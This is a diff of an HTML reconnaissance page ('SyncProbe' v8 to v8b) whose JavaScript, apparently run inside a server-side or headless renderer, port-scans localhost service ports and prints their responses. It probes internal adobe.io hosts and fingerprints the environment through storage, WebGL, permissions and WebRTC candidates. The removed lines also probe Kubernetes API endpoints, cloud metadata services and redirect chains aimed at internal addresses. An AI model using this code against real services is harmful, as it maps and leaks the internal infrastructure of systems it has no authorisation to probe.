@@ -1,5 +1,5 @@
 <html><body>
-<h2>v8 SyncProbe</h2>
+<h2>v8b SyncSafe</h2>
 <pre id="r"></pre>
 <script>
 var R=document.getElementById('r');
@@ -9,6 +9,8 @@ L('UA: '+navigator.userAgent);
 L('Cores: '+navigator.hardwareConcurrency);
 L('Mem: '+(navigator.deviceMemory||'?')+'GB');
 
+// Sync XHR with AbortController-style safety:
+// Only probe localhost (TCP RST is instant) and known-live Adobe hosts
 function sx(url,label){
   var t=Date.now();
   try{
@@ -20,88 +22,53 @@ function sx(url,label){
     L(label+': s='+x.status+' len='+rt.length+' t='+dt+'ms');
     if(x.status>0){
       var h=x.getAllResponseHeaders();
-      if(h)L('  H: '+h.replace(/\r?\n/g,' | ').substring(0,400));
-      if(rt.length>0&&rt.length<1200)L('  B: '+rt.substring(0,1200));
+      if(h)L('  H: '+h.replace(/\r?\n/g,' | ').substring(0,500));
+      if(rt.length>0&&rt.length<1500)L('  B: '+rt.substring(0,1500));
     }
   }catch(e){
     L(label+': '+e.name+' t='+(Date.now()-t)+'ms');
   }
 }
 
-function sxm(url,method,label,body,hdrs){
-  var t=Date.now();
-  try{
-    var x=new XMLHttpRequest();
-    x.open(method,url,false);
-    if(hdrs)for(var k in hdrs)try{x.setRequestHeader(k,hdrs[k]);}catch(ee){}
-    x.send(body||null);
-    var dt=Date.now()-t;
-    var rt=(x.responseText||'');
-    L(label+': s='+x.status+' len='+rt.length+' t='+dt+'ms');
-    if(rt.length>0&&rt.length<1200)L('  B: '+rt.substring(0,1200));
-  }catch(e){
-    L(label+': '+e.name+' t='+(Date.now()-t)+'ms');
-  }
-}
+// === LOCALHOST HTTPS PORT SCAN ===
+// TCP RST for closed ports = instant, TLS cert error for open = fast
+L('\n== lo HTTPS scan ==');
+sx('https://127.0.0.1/','443');
+sx('https://127.0.0.1:4443/','4443');
+sx('https://127.0.0.1:6443/','6443');
+sx('https://127.0.0.1:8443/','8443');
+sx('https://127.0.0.1:9090/','9090');
+sx('https://127.0.0.1:10250/','10250');
+sx('https://127.0.0.1:2379/','2379');
+sx('https://127.0.0.1:3000/','3000');
+sx('https://127.0.0.1:5000/','5000');
+sx('https://127.0.0.1:8080/','8080');
+sx('https://127.0.0.1:8888/','8888');
+sx('https://127.0.0.1:9200/','9200');
+sx('https://127.0.0.1:9222/','9222');
+sx('https://127.0.0.1:27017/','27017');
+sx('https://127.0.0.1:6379/','6379');
+sx('https://127.0.0.1:5432/','5432');
 
-// === LOCALHOST HTTPS PORT SCAN (timing reveals open vs closed) ===
-L('\n== Localhost HTTPS (timing=port scan) ==');
-sx('https://127.0.0.1/','lo:443');
-sx('https://127.0.0.1:4443/','lo:4443');
-sx('https://127.0.0.1:6443/','lo:6443');
-sx('https://127.0.0.1:8443/','lo:8443');
-sx('https://127.0.0.1:9090/','lo:9090');
-sx('https://127.0.0.1:10250/','lo:10250');
-sx('https://127.0.0.1:2379/','lo:2379');
-sx('https://127.0.0.1:3000/','lo:3000');
-sx('https://127.0.0.1:5000/','lo:5000');
-sx('https://127.0.0.1:8080/','lo:8080');
-sx('https://127.0.0.1:8888/','lo:8888');
-sx('https://127.0.0.1:9200/','lo:9200');
-sx('https://127.0.0.1:9222/','lo:9222');
-sx('https://127.0.0.1:27017/','lo:27017');
-sx('https://127.0.0.1:6379/','lo:6379');
-sx('https://127.0.0.1:5432/','lo:5432');
-sx('https://127.0.0.1:3306/','lo:3306');
-
-// === KUBERNETES API ===
-L('\n== K8s ==');
-sx('https://kubernetes.default.svc/version','k8s-ver');
-sx('https://kubernetes.default.svc/healthz','k8s-hlz');
-sx('https://kubernetes.default.svc.cluster.local/version','k8s-cl');
-sx('https://10.0.0.1/','k8s-gw');
-
-// === CLOUD METADATA HTTPS ===
-L('\n== CloudMeta ==');
-sx('https://169.254.169.254/','imds-s');
-sx('https://metadata.google.internal/','gcp');
-
-// === ADOBE INTERNAL ===
-L('\n== Adobe Internal ==');
+// === ADOBE INTERNAL (public DNS, valid certs, should respond fast) ===
+L('\n== Adobe HTTPS ==');
 sx('https://senseicore-ue1.adobe.io/','sensei');
-sx('https://senseicore-ue1.adobe.io/health','sensei-h');
 sx('https://dc-argus.adobe.io/','argus');
-sx('https://dc-argus.adobe.io/health','argus-h');
 sx('https://platform-cs-jpn3.adobe.io/','platcs');
 sx('https://dc-genai-content-platform-v2-jpn3.adobe.io/','genai');
 sx('https://dc-graph-proxy.adobe.io/','graphprx');
-
-// === HTTPBIN REDIRECT TO INTERNAL (follow redirect chain) ===
-L('\n== Redirect Probes ==');
-sx('https://httpbin.org/redirect-to?url=https%3A%2F%2Fkubernetes.default.svc%2Fversion&status_code=302','redir-k8s');
-sx('https://httpbin.org/redirect-to?url=https%3A%2F%2F127.0.0.1%3A6443%2Fversion&status_code=302','redir-lo6443');
+sx('https://dcdiscovery.adobe.io/','discovery');
+sx('https://dc-api-v2-jpn3.adobe.io/','dcapi');
 
 // === ENV FINGERPRINT ===
 L('\n== Env ==');
 try{var tz=Intl.DateTimeFormat().resolvedOptions();L('tz: '+tz.timeZone+' locale='+tz.locale);}catch(e){}
 try{L('conn: type='+navigator.connection.type+' eff='+navigator.connection.effectiveType+' dl='+navigator.connection.downlink+'Mbps rtt='+navigator.connection.rtt+'ms');}catch(e){L('conn: n/a');}
-try{L('dnt: '+navigator.doNotTrack);}catch(e){}
-try{L('pdf: '+navigator.pdfViewerEnabled);}catch(e){}
 try{L('cookieEnabled: '+navigator.cookieEnabled);}catch(e){}
-try{L('maxTouchPoints: '+navigator.maxTouchPoints);}catch(e){}
-try{var m=performance.memory;L('heapLimit: '+m.jsHeapSizeLimit+' heapUsed: '+m.usedJSHeapSize+' heapTotal: '+m.totalJSHeapSize);}catch(e){}
+try{var m=performance.memory;L('heap: limit='+m.jsHeapSizeLimit+' used='+m.usedJSHeapSize+' total='+m.totalJSHeapSize);}catch(e){}
+try{L('screen: '+screen.width+'x'+screen.height+' avail='+screen.availWidth+'x'+screen.availHeight+' dpr='+devicePixelRatio);}catch(e){}
 
-// WebGL renderer (reveals GPU/driver = infrastructure info)
+// WebGL
 L('\n== WebGL ==');
 try{
   var c=document.createElement('canvas');
@@ -115,85 +82,67 @@ try{
     L('renderer: '+gl.getParameter(gl.RENDERER));
   }
   L('version: '+gl.getParameter(gl.VERSION));
+  L('shading: '+gl.getParameter(gl.SHADING_LANGUAGE_VERSION));
+  L('maxTexSz: '+gl.getParameter(gl.MAX_TEXTURE_SIZE));
 }catch(e){L('WebGL: '+e.message);}
 
-// Cache API
-L('\n== Caches ==');
-try{
-  caches.keys().then(function(names){
-    R.textContent+='cacheNames: '+JSON.stringify(names)+'\n';
-    if(names.length>0){
-      names.forEach(function(n){
-        caches.open(n).then(function(cache){
-          cache.keys().then(function(reqs){
-            R.textContent+=n+': '+reqs.length+' entries\n';
-            reqs.forEach(function(req){
-              R.textContent+='  '+req.url+'\n';
-              cache.match(req).then(function(resp){
-                if(resp)resp.text().then(function(t){
-                  R.textContent+='    len='+t.length+' preview='+t.substring(0,200)+'\n';
-                });
-              });
-            });
-          });
-        });
-      });
-    }
-  });
-}catch(e){L('caches: '+e.message);}
+// Permissions API
+L('\n== Permissions ==');
+var perms=['geolocation','notifications','camera','microphone','clipboard-read','clipboard-write'];
+var permResults=[];
+perms.forEach(function(p){
+  try{
+    navigator.permissions.query({name:p}).then(function(r){
+      permResults.push(p+'='+r.state);
+      if(permResults.length===perms.length)R.textContent+='perms: '+permResults.join(', ')+'\n';
+    });
+  }catch(e){permResults.push(p+'=err');}
+});
 
-// Service Workers
-try{
-  navigator.serviceWorker.getRegistrations().then(function(regs){
-    R.textContent+='SW: '+regs.length+' registrations\n';
-    regs.forEach(function(r){R.textContent+='  scope='+r.scope+' active='+!!r.active+'\n';});
-  });
-}catch(e){L('SW: '+e.message);}
+// Cache/SW/IDB (async but rendered before busy-wait ends)
+L('\n== Storage ==');
+try{caches.keys().then(function(n){R.textContent+='cacheNames: '+JSON.stringify(n)+'\n';});}catch(e){L('caches: '+e.message);}
+try{navigator.serviceWorker.getRegistrations().then(function(r){R.textContent+='SW: '+r.length+'\n';});}catch(e){L('SW: '+e.message);}
+try{indexedDB.databases().then(function(d){R.textContent+='IDB: '+d.length+(d.length>0?' '+JSON.stringify(d):'')+'\n';});}catch(e){L('IDB: '+e.message);}
 
-// IndexedDB
-try{
-  indexedDB.databases().then(function(dbs){
-    R.textContent+='IDB: '+dbs.length+' databases\n';
-    dbs.forEach(function(d){R.textContent+='  '+d.name+' v'+d.version+'\n';});
-  });
-}catch(e){L('IDB: '+e.message);}
+// localStorage/sessionStorage
+try{L('localStorage keys: '+Object.keys(localStorage).length);if(Object.keys(localStorage).length>0)L('  keys: '+JSON.stringify(Object.keys(localStorage)));}catch(e){L('localStorage: '+e.message);}
+try{L('sessionStorage keys: '+Object.keys(sessionStorage).length);}catch(e){L('sessionStorage: '+e.message);}
 
-// Performance resource entries (from our XHR probes)
-L('\n== PerfEntries ==');
+// Performance resource entries
+L('\n== Perf ==');
 try{
   var entries=performance.getEntriesByType('resource');
-  L('total: '+entries.length);
+  L('resources: '+entries.length);
   entries.forEach(function(e){
     if(e.name.indexOf('github')>-1)return;
-    var dns=e.domainLookupEnd-e.domainLookupStart;
-    var tcp=e.connectEnd-e.connectStart;
-    var tls=e.secureConnectionStart>0?(e.connectEnd-e.secureConnectionStart):0;
-    var ttfb=e.responseStart-e.requestStart;
-    L('  '+e.name.substring(0,70)+' dns='+dns.toFixed(0)+' tcp='+tcp.toFixed(0)+' tls='+tls.toFixed(0)+' ttfb='+ttfb.toFixed(0)+'ms');
+    var dns=(e.domainLookupEnd-e.domainLookupStart).toFixed(0);
+    var tcp=(e.connectEnd-e.connectStart).toFixed(0);
+    var tls=e.secureConnectionStart>0?(e.connectEnd-e.secureConnectionStart).toFixed(0):'0';
+    L('  '+e.name.substring(0,80)+' dns='+dns+' tcp='+tcp+' tls='+tls+'ms');
   });
-}catch(e){L('perf: '+e.message);}
+}catch(e){}
 
-// SDP (synchronous part)
+// SDP
 L('\n== SDP ==');
 try{
   var pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
   pc.createDataChannel('d');
   pc.createOffer().then(function(o){
     pc.setLocalDescription(o);
-    var lines=o.sdp.split('\n');
-    for(var i=0;i<lines.length;i++){
-      var l=lines[i].trim();
+    o.sdp.split('\n').forEach(function(l){
+      l=l.trim();
       if(l.indexOf('c=')===0||l.indexOf('a=candidate')===0||l.indexOf('o=')===0||l.indexOf('a=fingerprint')===0)
         R.textContent+=l+'\n';
-    }
+    });
   });
 }catch(e){L('SDP: '+e.message);}
 
-// Busy wait at END to keep page alive for async results
-L('\n== Wait 8s ==');
+// Busy wait
+L('\n== Wait 6s ==');
 var start=Date.now();
-while(Date.now()-start<8000){}
+while(Date.now()-start<6000){}
 L('Done t='+(Date.now()-start)+'ms');
-L('== END v8 ==');
+L('== END v8b ==');
 </script>
 </body></html>
